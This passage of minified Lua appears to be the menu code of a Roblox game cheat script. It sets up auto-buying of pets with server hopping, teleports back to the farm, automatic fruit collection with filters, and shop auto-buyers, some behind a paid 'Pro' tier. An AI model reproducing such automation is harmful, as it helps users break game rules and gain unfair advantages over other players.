					Text = "<font color=\'#888888\'>No pet purchases recorded</font>";
					DoesWrap = true
				})
				table.insert(G, V)
			else
				for V, y in ipairs(y) do
					local Z = tonumber(y.purchased_at) and os.date("%d/%m %H:%M", y.purchased_at) or "Unknown time"
					local j = i:AddLabel({
						Text = string.format("\240\159\144\190 %s %s %s | <font color=\'#7CFC00\'>%s</font> | %s", tostring(y.size or "Normal"), tostring(y.variant or "Normal"), tostring(y.display_name or y.pet or "Unknown"), q.formatShecklesNumber(y.price), Z);
						DoesWrap = true
					})
					table.insert(G, j)
				end
			end
			if i.Resize then
				i:Resize()
			end
		end
		i:AddButton({
			Text = "\240\159\167\185 Clear Purchase Log";
			Tooltip = "Clears the saved pet purchase history.",
			Func = function()
				h.pet_finder_purchase_log = {}
				a.Save.SaveDataSync()
				y()
			end
		})
		g.PetFinderPremiumUi.RefreshLog = y
		y()
	end
	if V then
		V:AddLabel({
			Text = "\240\159\144\190 Watches new wild pets and buys pets that match your enabled rules.";
			DoesWrap = true
		})
		local function G()
			return string.format("\226\143\177\239\184\143 Hop Timer <font color=\'#3CB371\'>(%dm)</font>", Z.PetFinderPremium.GetHopMinutes())
		end
		local y
		y = V:AddInput("pet_finder_premium_hop_minutes_ui", {
			Text = G(),
			Default = tostring(h.pet_finder_hop_minutes),
			Numeric = true;
			AllowEmpty = true;
			Finished = true;
			ClearTextOnFocus = false;
			Placeholder = "Minimum 1 minute";
			Tooltip = "How long to watch the current server before hopping.";
			Callback = function(V)
				local j = z(V)
				if not j or j < 1 then
					g.Notify("Hop timer must be 1 minute or more", 3)
					y:SetValue(tostring(h.pet_finder_hop_minutes))
					return
				end
				h.pet_finder_hop_minutes = j
				y:SetText(G())
				Z.PetFinderPremium.ResetHopTimer()
				a.Save.SaveDataSync()
			end
		})
		V:AddToggle("pet_finder_premium_auto_hop_ui", {
			Text = "\240\159\154\128 Auto Hop Server";
			Default = h.pet_finder_auto_hop,
			Tooltip = "Hops after the selected watch timer when no matching pet is ready.",
			Callback = function(G)
				h.pet_finder_auto_hop = G
				Z.PetFinderPremium.ResetHopTimer()
				a.Save.SaveDataSync()
			end
		})
		local j
		j = V:AddToggle("pet_finder_premium_enabled_ui", {
			Text = "\240\159\144\190 Enable Pet Finder Premium";
			Default = h.pet_finder_enabled,
			Tooltip = "Automatically buys pets from your enabled buy list.",
			DisabledTooltip = g.GetProMessage();
			Callback = function(G)
				h.pet_finder_enabled = G
				if G then
					Z.PetFinderPremium.ResetHopTimer()
					Z.PetFinderPremium.FullScan()
				else
					Z.PetFinderPremium.ClearStatus()
					Z.Teleport.UnlockTeleport(g.TeleportLockNames.PetFinderPremium)
				end
				a.Save.SaveDataSync()
			end
		})
		j:SetDisabled(not g.GetCheckIfPro())
	end
	if y then
		y:AddLabel({
			Text = "\240\159\144\190 Returns you to the farm centre when you are too far away.",
			DoesWrap = true
		})
		local function G()
			return string.format("\226\143\177\239\184\143 Return Timer <font color=\'#3CB371\'>(%ss)</font>", Z.PetFarmReturn.GetTimer())
		end
		local V
		V = y:AddInput("pet_return_farm_timer_ui", {
			Text = G(),
			Default = tostring(h.pet_return_farm_timer);
			Numeric = true;
			AllowEmpty = true,
			Finished = true;
			ClearTextOnFocus = false,
			Placeholder = "Minimum 3 seconds";
			Tooltip = "How often to check if you are too far from the farm.";
			Callback = function(y)
				local j = z(y)
				if not j or j < 3 then
					g.Notify("Timer must be 3 seconds or more", 3)
					V:SetValue(tostring(h.pet_return_farm_timer))
					return
				end
				h.pet_return_farm_timer = j
				V:SetText(G())
				Z.PetFarmReturn.ResetTimer()
				a.Save.SaveDataSync()
			end
		})
		y:AddToggle("pet_return_farm_enabled_ui", {
			Text = "\240\159\143\161 Enable Farm Return";
			Default = h.pet_return_farm;
			Tooltip = "Returns you to the farm centre when you are more than 20 studs away.";
			Callback = function(G)
				h.pet_return_farm = G
				if G then
					Z.PetFarmReturn.ResetTimer()
				else
					g.PetFarmStatusText = ""
				end
				a.Save.SaveDataSync()
			end
		})
	end
end
g.CollectUi = function()
	local G = d:AddTab({
		Name = "Fruit Collect",
		Description = "Fruit Collection",
		Icon = "store"
	})
	local V = G:AddLeftGroupbox("Fruit Collector", "badge-dollar-sign")
	local y = G:AddLeftGroupbox("Buy Select Fruit", "mouse-pointer-click")
	local j = G:AddRightGroupbox("Fruit Filters", "sliders-horizontal")
	local i = G:AddRightGroupbox("Override Fruit Collection", "list-plus")
	if y then
		y:AddLabel({
			Text = "Select 1 or more garden fruits, then press Collect Selected. \226\156\133 means ready, \240\159\149\146 means still growing.";
			DoesWrap = true
		})
		local G
		G = y:AddValueDropdown("buy_select_garden_fruit_v1", {
			Values = {};
			Default = {};
			Multi = true,
			Text = "\240\159\141\142 Garden Fruits";
			Tooltip = "Choose exact garden fruits to collect.",
			Searchable = true,
			MaxVisibleDropdownItems = 10,
			Changed = function(G)
				g.BuySelectFruitSelected = G or {}
			end
		})
		g.BuySelectFruitUi.Dropdown = G
		y:AddButton({
			Text = "\226\153\187\239\184\143 Reload Garden Fruits",
			Tooltip = "Refreshes the garden fruit list.",
			Func = function()
				Z.BuySelectFruit.RefreshDropdownBuySelectFruit(G, true)
			end
		})
		y:AddButton({
			Text = "\226\156\133 Collect Selected";
			Tooltip = "Collects selected fruits that are ready.";
			Func = function()
				task.spawn(function()
					local V, y = pcall(function()
						Z.BuySelectFruit.CollectSelectedBuySelectFruit(g.BuySelectFruitSelected)
					end)
					if not V then
						Z.BuySelectFruit.BusyBuySelectFruit = false
						Z.BuySelectFruit.SetStatusBuySelectFruit("Collect failed", "#FF6666")
						warn("[BuySelectFruit]", y)
					end
					Z.BuySelectFruit.RefreshDropdownBuySelectFruit(G, false, true)
				end)
			end
		})
		g.BuySelectFruitUi.StatusLabel = y:AddLabel({
			Text = "Ready";
			DoesWrap = true
		})
		Z.BuySelectFruit.RefreshDropdownBuySelectFruit(G, false)
	end
	if V then
		local G
		G = V:AddValueDropdown("dd_collect_frutisx22", {
			Values = {};
			Default = {};
			Multi = true,
			Text = "\240\159\140\177 Collect Fruits",
			Tooltip = "Selected Fruits will be collected if they are ready.",
			Searchable = true,
			MaxVisibleDropdownItems = 10,
			Changed = function(G)
				if not G then
					return
				end
				h.collect_fruit_list = G
				Z.FruitCollect.ResetBucket()
				a.Save.SaveDataSync()
			end
		})
		G:SetValues(Z.FruitFilters.GetFruitTypeDropdownWithFarmCounts())
		G:SetValue(h.collect_fruit_list)
		V:AddButton({
			Text = "\226\153\187\239\184\143 Reload Fruit List";
			Tooltip = "Refreshes farm fruit counts in the list.",
			Func = function()
				G:SetValues(Z.FruitFilters.GetFruitTypeDropdownWithFarmCounts())
				G:SetValue(h.collect_fruit_list)
				Z.FruitCollect.ResetBucket()
			end
		})
		V:AddToggle("collection_teleportcollect", {
			Text = "<font color=\'#FFFFFF\'>\240\159\147\161 Auto Teleport</font>";
			Default = h.collection_teleport,
			Tooltip = "Teleports back to your garden if you are out of collection range.",
			Callback = function(G)
				h.collection_teleport = G
				a.Save.SaveData()
			end
		})
		V:AddValueDropdown("collect_sort_mode_v1", {
			Values = {
				{
					Text = "Default",
					Value = "Default"
				},
				{
					Text = "Highest Price > Lowest",
					Value = "Highest Price > Lowest"
				};
				{
					Text = "Lowest Price > Highest",
					Value = "Lowest Price > Highest"
				}
			},
			Default = h.collect_sort_mode,
			Multi = false,
			Text = "\240\159\146\176 Collect Sort";
			Tooltip = "Choose which ready fruits are collected first.";
			Searchable = false,
			MaxVisibleDropdownItems = 3,
			Changed = function(G)
				local V = tostring(G or "Default")
				if type(G) == "table" then
					V = "Default"
					for G, y in pairs(G) do
						V = tostring(y or "Default")
						break
					end
				end
				if V ~= "Highest Price > Lowest" and V ~= "Lowest Price > Highest" then
					V = "Default"
				end
				h.collect_sort_mode = V
				Z.LiteFruitCollection.OnChangedValuesLiteMode()
				a.Save.SaveData()
			end
		})
		V:AddToggle("lite_fruit_collection_ui", {
			Text = "\226\173\144 <font color=\'#FFD700\'>[Total Control [LITE]]</font> Fruit Collection";
			Default = h.lite_fruit_collection == true,
			Tooltip = "Uses a lower CPU collection mode for low FPS farming.";
			Callback = function(G)
				h.lite_fruit_collection = G == true
				Z.LiteFruitCollection.OnChangedValuesLiteMode()
				a.Save.SaveData()
			end
		})
		V:AddSlider("lite_fruit_collection_speed_ui", {
			Text = "\226\156\168 Collection Power",
			Default = math.clamp(tonumber(h.lite_fruit_collection_speed) or 40, 0, 100);
			Min = 0,
			Max = 100,
			Rounding = 0;
			Suffix = "%";
			Tooltip = "Higher power collects faster but may use more CPU.",
			Callback = function(G)
				h.lite_fruit_collection_speed = math.clamp(math.floor(tonumber(G) or 40), 0, 100)
				Z.LiteFruitCollection.OnChangedValuesLiteMode()
				a.Save.SaveData()
			end
		})
		V:AddToggle("enablefruitcollector", {
			Text = "<font color=\'#CF02B0\'>\240\159\154\128 Fast Fruit Collector</font>";
			Default = h.auto_collect_fruit_enabled;
			Tooltip = "Collects fruits and teleports you to the farm.",
			Callback = function(G)
				h.auto_collect_fruit_enabled = G
				Z.LiteFruitCollection.OnChangedValuesLiteMode()
				a.Save.SaveData()
			end
		})
	end
	if i then
		local G = ""
		local V = {}
		local y = {}
		local j = {}
		local c = 0
		local J = 99
		local T = true
		local d = false
		local u = false
		local q = {}
		local E = 0
		local a
		local H
		local r
		local Y
		local e
		local s
		local N
		local W
		i:AddLabel({
			Text = "\240\159\146\161 Selected fruits use these custom collect rules. Other fruits keep normal collector behaviour.",
			DoesWrap = true
		})
		local function X()
			for G, V in ipairs(q) do
				if V.Holder and typeof(V.Holder) == "Instance" then
					V.Holder:Destroy()
				end
			end
			table.clear(q)
			if i.Resize then
				i:Resize()
			end
		end
		local function h(G)
			local V = f(G)
			if not V then
				V = c
			end
			return string.format("\226\172\135\239\184\143 Override Min %.2fKG", tonumber(V) or 0)
		end
		local function l(G)
			local V = f(G)
			if not V then
				V = J
			end
			return string.format("\226\172\134\239\184\143 Override Max %.2fKG", tonumber(V) or 99)
		end
		local function B()
			local y = {}
			local j = {}
			if type(V) == "table" then
				for G, V in pairs(V) do
					local i = ""
					if type(G) == "number" then
						i = tostring(V or "")
					elseif V ~= nil and V ~= false then
						i = tostring(G or "")
					end
					if Z.FruitCollectOverrides.IsValidFruitNameFruitCollectOverrides(i) and not j[i] then
						j[i] = true
						table.insert(y, i)
					end
				end
			end
			if # y > 0 then
				table.sort(y)
				return y
			end
			if Z.FruitCollectOverrides.IsValidFruitNameFruitCollectOverrides(G) then
				table.insert(y, G)
			end
			return y
		end
		local function L()
			if G == "" then
				return
			end
			local V = Z.FruitCollectOverrides.GetOverrideFruitCollectOverrides(G)
			y = type(V) == "table" and V.collect_if_mutations or {}
			j = type(V) == "table" and V.dont_collect_if_mutations or {}
			c = type(V) == "table" and tonumber(V.min_weight) or 0
			J = type(V) == "table" and tonumber(V.max_weight) or 99
			if type(V) == "table" then
				T = V.collect_lower_kg_fruits == true
				d = V.protect_kg_range == true
			else
				T = true
				d = false
			end
			u = true
			if r then
				r:SetValue(y)
			end
			if Y then
				Y:SetValue(j)
			end
			if e then
				e:SetValue(tostring(c))
				e:SetText(h(c))
			end
			if s then
				s:SetValue(tostring(J))
				s:SetText(l(J))
			end
			if N and type(N.SetValue) == "function" then
				N:SetValue(T)
			end
			if W and type(W.SetValue) == "function" then
				W:SetValue(d)
			end
			u = false
		end
		local m
		m = function()
			X()
			E += 1
			local V = Z.FruitCollectOverrides.GetSortedOverridesFruitCollectOverrides()
			if # V == 0 then
				local G = i:AddLabel({
					Text = "<font color=\'#888888\'>No active fruit overrides</font>";
					DoesWrap = true
				})
				table.insert(q, G)
			else
				for V, y in ipairs(V) do
					local j = tostring(y.fruitName or "")
					local c = Z.FruitCollectOverrides.GetOverrideUiKeyFruitCollectOverrides(j) .. ("_" .. (tostring(E) .. ("_" .. tostring(V))))
					local J = i:AddToggle(c, {
						Text = Z.FruitCollectOverrides.GetOverrideSummaryFruitCollectOverrides(j, y.rule),
						Default = type(y.rule) == "table" and y.rule.enabled ~= false;
						Tooltip = "Enable or disable this fruit override.";
						Callback = function(G)
							if u then
								return
							end
							Z.FruitCollectOverrides.ToggleOverrideFruitCollectOverrides(j, G == true)
						end
					})
					local T = i:AddButton({
						Text = "\240\159\151\145 Remove Override",
						Tooltip = "Removes this fruit override.";
						Func = function()
							Z.FruitCollectOverrides.RemoveOverrideFruitCollectOverrides(j)
							if G == j then
								L()
							end
						end
					})
					local d = i:AddLabel({
						Text = "<font color=\'#444444\'>\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128</font>",
						DoesWrap = false
					})
					table.insert(q, J)
					table.insert(q, T)
					table.insert(q, d)
				end
			end
			if i.Resize then
				i:Resize()
			end
		end
		g.FruitCollectOverrideUiRefs.RefreshOverridesFruitCollectOverrides = m
		a = i:AddValueDropdown("collect_override_fruit_name", {
			Values = {},
			Default = "",
			Multi = false,
			Searchable = true,
			MaxVisibleDropdownItems = 10;
			Text = "\240\159\140\177 Select Fruit";
			Tooltip = "Select the fruit that should use custom collect rules.",
			Changed = function(y)
				if type(y) ~= "string" or y == "" then
					return
				end
				G = y
				if type(V) == "table" and next(V) ~= nil then
					return
				end
				L()
			end
		})
		H = i:AddValueDropdown("collect_override_multi_fruit_names", {
			Values = {};
			Default = {},
			Multi = true;
			Searchable = true,
			MaxVisibleDropdownItems = 10;
			Text = "\240\159\140\177 Select Multiple Fruits",
			Tooltip = "When any fruits are selected here, the same override is saved for all of them and the single fruit selector is ignored.",
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				V = G
			end
		})
		local K = Z.FruitFilters.GetFruitTypeDropdownWithFarmCounts()
		a:SetValues(K)
		H:SetValues(K)
		i:AddButton({
			Text = "\226\153\187\239\184\143 Reload Fruit List";
			Tooltip = "Refreshes fruit names and farm counts.",
			Func = function()
				local G = Z.FruitFilters.GetFruitTypeDropdownWithFarmCounts()
				a:SetValues(G)
				if H then
					H:SetValues(G)
				end
			end
		})
		r = i:AddValueDropdown("collect_override_if_mutations", {
			Values = Z.FruitCollectOverrides.GetMutationDropdownFruitCollectOverrides();
			Default = {},
			Multi = true,
			Searchable = true,
			MaxVisibleDropdownItems = 10,
			Text = "\226\156\133 Collect If Mutation";
			Tooltip = "Only this fruit needs one of these mutations. Empty allows any mutation unless blocked.";
			Changed = function(G)
				if u or type(G) ~= "table" then
					return
				end
				y = G
			end
		})
		Y = i:AddValueDropdown("collect_override_block_mutations", {
			Values = Z.FruitCollectOverrides.GetMutationDropdownFruitCollectOverrides();
			Default = {};
			Multi = true;
			Searchable = true;
			MaxVisibleDropdownItems = 10,
			Text = "\226\155\148 Don\'t Collect If Mutation";
			Tooltip = "This fruit will not be collected when it has any selected mutation.",
			Changed = function(G)
				if u or type(G) ~= "table" then
					return
				end
				j = G
			end
		})
		e = i:AddInput("collect_override_min_weight", {
			Text = h(c);
			Default = tostring(c),
			Numeric = true;
			AllowEmpty = true,
			Finished = true;
			ClearTextOnFocus = false;
			Placeholder = "Minimum KG";
			Tooltip = "This fruit must be at least this KG.",
			Changed = function(G)
				if e then
					e:SetText(h(G))
				end
			end;
			Callback = function(G)
				if u then
					return
				end
				local V = f(G)
				if not V or V < 0 then
					g.Notify("Override minimum KG must be 0 or more", 3)
					e:SetValue(tostring(c))
					e:SetText(h(c))
					return
				end
				if V > J then
					g.Notify("Override minimum KG must be lower than maximum KG", 3)
					e:SetValue(tostring(c))
					e:SetText(h(c))
					return
				end
				c = Z.FruitFilters.RoundWeight(V)
				e:SetText(h(c))
			end
		})
		s = i:AddInput("collect_override_max_weight", {
			Text = l(J);
			Default = tostring(J);
			Numeric = true;
			AllowEmpty = true,
			Finished = true,
			ClearTextOnFocus = false;
			Placeholder = "Maximum KG";
			Tooltip = "This fruit must be at most this KG.",
			Changed = function(G)
				if s then
					s:SetText(l(G))
				end
			end,
			Callback = function(G)
				if u then
					return
				end
				local V = f(G)
				if not V or V < 0 then
					g.Notify("Override maximum KG must be 0 or more", 3)
					s:SetValue(tostring(J))
					s:SetText(l(J))
					return
				end
				if V < c then
					g.Notify("Override maximum KG must be higher than minimum KG", 3)
					s:SetValue(tostring(J))
					s:SetText(l(J))
					return
				end
				J = Z.FruitFilters.RoundWeight(V)
				s:SetText(l(J))
			end
		})
		N = i:AddToggle("collect_override_lower_kg_fruits", {
			Text = "\240\159\141\143 Collect Lower KG Fruits";
			Default = T;
			Tooltip = "Collects this fruit normally when it is below the override minimum KG.",
			Callback = function(G)
				if u then
					return
				end
				T = G == true
			end
		})
		W = i:AddToggle("collect_override_protect_kg_range", {
			Text = "\240\159\155\161 Keep/Protect this KG range",
			Default = d,
			Tooltip = "Keeps matching fruit in this KG range instead of collecting it. Selected mutations narrow what is protected.";
			Callback = function(G)
				if u then
					return
				end
				d = G == true
			end
		})
		i:AddButton({
			Text = "\226\158\149 Add / Update Override";
			Tooltip = "Saves the custom rule for the selected fruit. Multiple selected fruits are updated together.";
			Func = function()
				local V = B()
				local i = 0
				local u = "Fruit override saved"
				if # V == 0 then
					local V, i = Z.FruitCollectOverrides.SaveOverrideFruitCollectOverrides(G, y, j, c, J, T, d)
					g.Notify(tostring(i or (V and "Fruit override saved" or "Failed to save override")), 3)
					L()
					return
				end
				for G, V in ipairs(V) do
					local q, g = Z.FruitCollectOverrides.SaveOverrideFruitCollectOverrides(V, y, j, c, J, T, d)
					u = tostring(g or u)
					if q then
						i += 1
					end
				end
				if # V > 1 then
					g.Notify(i == # V and "Saved " .. (tostring(i) .. " fruit overrides") or "Saved " .. (tostring(i) .. ("/" .. (tostring(# V) .. " fruit overrides"))), 3)
				else
					g.Notify(tostring(u or (i > 0 and "Fruit override saved" or "Failed to save override")), 3)
				end
				L()
			end
		})
		i:AddDivider()
		i:AddLabel({
			Text = "= <font color=\'#7CFC00\'>Active Fruit Overrides</font> =";
			DoesWrap = true
		})
		m()
	end
	if j then
		j:AddLabel({
			Text = "\226\132\185\239\184\143 Press Enter after changing KG values. Empty mutation or variant lists collect everything unless protected below.",
			DoesWrap = true
		})
		local G
		local V
		local function y(G)
			local V = f(G)
			if not V then
				V = tonumber(h.collect_min_weight) or 0
			end
			return string.format("\226\172\135\239\184\143 Min Weight %.2fKG", V)
		end
		local function i(G)
			local V = f(G)
			if not V then
				V = tonumber(h.collect_max_weight) or 89
			end
			return string.format("\226\172\134\239\184\143 Max Weight %.2fKG", V)
		end
		G = j:AddInput("collect_min_weight", {
			Text = y(h.collect_min_weight),
			Default = tostring(h.collect_min_weight);
			Numeric = true,
			AllowEmpty = true,
			Finished = true;
			ClearTextOnFocus = false,
			Placeholder = "Press Enter to update",
			Tooltip = "Press Enter to update. Fruits below this KG will not be collected.";
			Changed = function(V)
				if G then
					G:SetText(y(V))
				end
			end;
			Callback = function(V)
				local j = f(V)
				if not j then
					g.Notify("Invalid minimum KG", 3)
					G:SetValue(tostring(h.collect_min_weight))
					G:SetText(y(h.collect_min_weight))
					return
				end
				if j < 0 then
					g.Notify("Minimum KG must be 0 or more", 3)
					G:SetValue(tostring(h.collect_min_weight))
					G:SetText(y(h.collect_min_weight))
					return
				end
				local i = tonumber(h.collect_max_weight) or 89
				if j > i then
					g.Notify("Minimum KG must be lower than maximum KG", 3)
					G:SetValue(tostring(h.collect_min_weight))
					G:SetText(y(h.collect_min_weight))
					return
				end
				h.collect_min_weight = Z.FruitFilters.RoundWeight(j)
				G:SetText(y(h.collect_min_weight))
				Z.FruitCollect.ResetBucket()
				a.Save.SaveDataSync()
			end
		})
		V = j:AddInput("collect_max_weight", {
			Text = i(h.collect_max_weight);
			Default = tostring(h.collect_max_weight),
			Numeric = true,
			AllowEmpty = true,
			Finished = true;
			ClearTextOnFocus = false,
			Placeholder = "Press Enter to update",
			Tooltip = "Press Enter to update. Fruits above this KG will not be collected.";
			Changed = function(G)
				if V then
					V:SetText(i(G))
				end
			end;
			Callback = function(G)
				local y = f(G)
				if not y then
					g.Notify("Invalid maximum KG", 3)
					V:SetValue(tostring(h.collect_max_weight))
					V:SetText(i(h.collect_max_weight))
					return
				end
				if y < 0 then
					g.Notify("Maximum KG must be 0 or more", 3)
					V:SetValue(tostring(h.collect_max_weight))
					V:SetText(i(h.collect_max_weight))
					return
				end
				local j = tonumber(h.collect_min_weight) or 0
				if y < j then
					g.Notify("Maximum KG must be higher than minimum KG", 3)
					V:SetValue(tostring(h.collect_max_weight))
					V:SetText(i(h.collect_max_weight))
					return
				end
				h.collect_max_weight = Z.FruitFilters.RoundWeight(y)
				V:SetText(i(h.collect_max_weight))
				Z.FruitCollect.ResetBucket()
				a.Save.SaveDataSync()
			end
		})
		j:AddDivider()
		local c
		c = j:AddValueDropdown("collect_mutation_whitelist", {
			Values = Z.FruitFilters.GetMutationNames(),
			Default = {},
			Multi = true;
			Text = "\226\156\133 Only Mutations",
			Tooltip = "Only collect fruits with selected mutations. Empty allows all mutations.",
			Searchable = true,
			MaxVisibleDropdownItems = 10;
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.collect_mutation_whitelist = G
				Z.FruitCollect.ResetBucket()
				a.Save.SaveDataSync()
			end
		})
		c:SetValue(h.collect_mutation_whitelist)
		local J
		J = j:AddValueDropdown("collect_mutation_blacklist", {
			Values = Z.FruitFilters.GetMutationNames();
			Default = {};
			Multi = true;
			Text = "\226\155\148 Block Mutations";
			Tooltip = "Selected mutations will not be collected.",
			Searchable = true;
			MaxVisibleDropdownItems = 10;
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.collect_mutation_blacklist = G
				Z.FruitCollect.ResetBucket()
				a.Save.SaveDataSync()
			end
		})
		J:SetValue(h.collect_mutation_blacklist)
		j:AddDivider()
		local T
		T = j:AddValueDropdown("collect_variant_whitelist", {
			Values = Z.FruitFilters.GetVariantNames(),
			Default = {};
			Multi = true;
			Text = "\226\156\133 Only Variants";
			Tooltip = "Only collect selected variants. Empty allows all variants.",
			Searchable = false,
			MaxVisibleDropdownItems = 5;
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.collect_variant_whitelist = G
				Z.FruitCollect.ResetBucket()
				a.Save.SaveDataSync()
			end
		})
		T:SetValue(h.collect_variant_whitelist)
		local d
		d = j:AddValueDropdown("collect_variant_blacklist", {
			Values = Z.FruitFilters.GetVariantNames();
			Default = {};
			Multi = true,
			Text = "\240\159\155\161\239\184\143 Protect Variants";
			Tooltip = "Selected variants will not be collected.",
			Searchable = false,
			MaxVisibleDropdownItems = 5,
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.collect_variant_blacklist = G
				Z.FruitCollect.ResetBucket()
				a.Save.SaveDataSync()
			end
		})
		d:SetValue(h.collect_variant_blacklist)
	end
end
g.Shopui = function()
	local G = d:AddTab({
		Name = "Shop",
		Description = "Shop",
		Icon = "store"
	})
	local V = G:AddLeftGroupbox("Seed Shop", "sprout")
	local y = G:AddRightGroupbox("Gear Shop", "wrench")
	local j = G:AddLeftGroupbox("Crate Shop", "package")
	local function i(G, V)
		local y = tonumber(V)
		if not y then
			y = E.Currency.ParseMoney(tostring(V or h[G .. "_min_sheckles"] or 0))
		end
		y = math.max(tonumber(y) or 0, 0)
		return "\240\159\146\176 Keep Min Sheckles: " .. E.Currency.FormatMoney(y)
	end
	local function c(G, V, y)
		if not G then
			return
		end
		G:AddToggle(y .. "_enabled", {
			Text = "\240\159\146\176 Enable Sheckles Reserve",
			Default = h[V .. "_min_sheckles_enabled"] == true,
			Tooltip = "When enabled, the shop keeps this much money saved and only spends above it.",
			Callback = function(G)
				h[V .. "_min_sheckles_enabled"] = G == true
				a.Save.SaveDataSync()
			end
		})
		local Z
		local j = false
		local function c(G)
			if Z then
				Z:SetText(i(V, G))
			end
		end
		local function J(G)
			if not Z then
				return
			end
			j = true
			Z:SetValue(E.Currency.FormatMoney(G))
			Z:SetText(i(V, G))
			j = false
		end
		Z = G:AddInput(y, {
			Text = i(V, h[V .. "_min_sheckles"]),
			Default = E.Currency.FormatMoney(h[V .. "_min_sheckles"]),
			Numeric = false;
			AllowEmpty = true,
			Finished = true,
			ClearTextOnFocus = false,
			Placeholder = "0 or 67m";
			Tooltip = "Press Enter to update. 0 disables the amount check.";
			Changed = function(G)
				if j then
					return
				end
				c(G)
			end,
			Callback = function(G)
				if j then
					return
				end
				local y = (tostring(G or "")):match("^%s*(.-)%s*$") or ""
				local Z = y == "" and 0 or E.Currency.ParseMoney(y)
				if not Z or Z < 0 then
					g.Notify("Invalid sheckles amount", 3)
					J(h[V .. "_min_sheckles"])
					return
				end
				h[V .. "_min_sheckles"] = math.floor(Z)
				J(h[V .. "_min_sheckles"])
				a.Save.SaveDataSync()
			end
		})
	end
	local function J(G, V, y)
		if not G then
			return
		end
		G:AddToggle(y .. "_enabled", {
			Text = "\240\159\140\166\239\184\143 Enable Trigger Buying";
			Default = h[V .. "_trigger_enabled"] == true;
			Tooltip = "When enabled, the shop only buys during the selected phase or weather.";
			Callback = function(G)
				h[V .. "_trigger_enabled"] = G == true
				a.Save.SaveDataSync()
			end
		})
		local Z
		Z = G:AddDropdown(y, {
			Values = Y.ShopTrigger.GetValuesShopTrigger();
			Default = tostring(h[V .. "_trigger_name"] or "Any Time"),
			Multi = false;
			Text = "\240\159\140\166\239\184\143 Trigger",
			Tooltip = "Choose when this shop is allowed to buy.",
			Callback = function(G)
				if type(G) ~= "string" or G == "" then
					return
				end
				h[V .. "_trigger_name"] = G
				a.Save.SaveDataSync()
			end
		})
		Z:SetValue(tostring(h[V .. "_trigger_name"] or "Any Time"))
	end
	local function T(G, V, y, Z)
		if not G or not V then
			return
		end
		local j = G:AddButton({
			Text = "\226\156\133 Select All",
			Func = function()
				h[y] = Y.ShopBuyer.GetAllSelectionShopBuyer(Z)
				V:SetValue(h[y])
				a.Save.SaveDataSync()
			end
		})
		j:AddButton({
			Text = "\240\159\167\185 Clear";
			Func = function()
				h[y] = {}
				V:SetValue({})
				a.Save.SaveDataSync()
			end
		})
	end
	if V then
		V:AddLabel({
			Text = "\226\132\185\239\184\143 Select the seeds you want to buy. Nothing is bought unless it is selected.";
			DoesWrap = true
		})
		local G
		G = V:AddValueDropdown("seedshop_buy_selected_v2", {
			Values = {};
			Default = {};
			Multi = true;
			Text = "\226\156\133 Buy Selected Seeds";
			Tooltip = "Selected seeds will be purchased when in stock.",
			Searchable = true,
			MaxVisibleDropdownItems = 10;
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.seed_shop_buy_selected = G
				a.Save.SaveDataSync()
			end
		})
		G:SetValues(Z.SeedData.GetSeedShopDropDown())
		G:SetValue(h.seed_shop_buy_selected)
		T(V, G, "seed_shop_buy_selected", g.SeedShopDataList)
		V:AddToggle("seedshopautobuyenabled", {
			Text = "<font color=\'#FFFFFF\'>\240\159\140\177 Enable Seed Shop</font>",
			Default = h.enabled_seed_shop;
			Tooltip = "When enabled, buys selected seeds only.",
			Callback = function(G)
				h.enabled_seed_shop = G == true
				a.Save.SaveData()
			end
		})
		c(V, "seed_shop", "seed_shop_min_sheckles_ui")
		J(V, "seed_shop", "seed_shop_trigger_ui")
	end
	if y then
		y:AddLabel({
			Text = "\226\132\185\239\184\143 Select the gear you want to buy. Nothing is bought unless it is selected.",
			DoesWrap = true
		})
		local G
		G = y:AddValueDropdown("gearshop_buy_selected_v2", {
			Values = {};
			Default = {};
			Multi = true;
			Text = "\226\156\133 Buy Selected Gear",
			Tooltip = "Selected gear will be purchased when in stock.",
			Searchable = true,
			MaxVisibleDropdownItems = 10;
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.gear_shop_buy_selected = G
				a.Save.SaveDataSync()
			end
		})
		G:SetValues(Z.GearData.GetGearShopDropDown())
		G:SetValue(h.gear_shop_buy_selected)
		T(y, G, "gear_shop_buy_selected", g.AllGearShopData)
		y:AddToggle("dd_gearshop_enabled_v2", {
			Text = "<font color=\'#FFFFFF\'>\240\159\148\171 Enable Gear Shop</font>",
			Default = h.enabled_gear_shop,
			Tooltip = "When enabled, buys selected gear only.";
			Callback = function(G)
				h.enabled_gear_shop = G == true
				a.Save.SaveData()
			end
		})
		c(y, "gear_shop", "gear_shop_min_sheckles_ui")
		J(y, "gear_shop", "gear_shop_trigger_ui")
	end
	if j then
		j:AddLabel({
			Text = "\226\132\185\239\184\143 Crate Shop is disabled by default. Select crates first, then enable it.";
			DoesWrap = true
		})
		local G
		G = j:AddValueDropdown("crateshop_buy_selected_v1", {
			Values = {},
			Default = {};
			Multi = true;
			Text = "\226\156\133 Buy Selected Crates",
			Tooltip = "Selected crates will be purchased when in stock.";
			Searchable = true;
			MaxVisibleDropdownItems = 10,
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.crate_shop_buy_selected = G
				a.Save.SaveDataSync()
			end
		})
		G:SetValues(Z.CrateData.GetCrateShopDropDown())
		G:SetValue(h.crate_shop_buy_selected)
		T(j, G, "crate_shop_buy_selected", g.CrateShopDataList)
		j:AddToggle("crateshopautobuyenabled_v1", {
			Text = "<font color=\'#FFFFFF\'>\240\159\147\166 Enable Crate Shop</font>";
			Default = h.enabled_crate_shop;
			Tooltip = "When enabled, buys selected crates only.",
			Callback = function(G)
				h.enabled_crate_shop = G == true
				a.Save.SaveData()
			end
		})
		c(j, "crate_shop", "crate_shop_min_sheckles_ui")
		J(j, "crate_shop", "crate_shop_trigger_ui")
	end
end
g.AuctioneerUi = function()
	local G = d:AddTab({
		Name = "Auctioneer " .. g.GetProLabel();
		Description = "Auto buy selected auction items.",
